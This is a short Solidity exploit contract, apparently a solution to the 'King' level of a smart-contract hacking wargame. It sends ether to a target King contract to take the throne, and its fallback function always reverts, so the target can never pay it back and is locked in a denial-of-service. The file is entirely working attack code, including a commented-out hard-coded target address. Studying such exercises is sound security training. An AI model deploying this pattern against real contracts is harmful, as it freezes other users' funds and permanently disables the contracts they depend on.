// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/King.sol";


contract King_exp{
    King king;

    function pwn(address payable victim) public payable {
        // king = King(payable(0xB656bD685011143cC2Ba4A5561f13663303d4997));
        king = King(payable(victim));
        address(king).call{value : msg.value}("");
    }

    fallback() external payable{
        // msg.value;
        revert();
    }
}
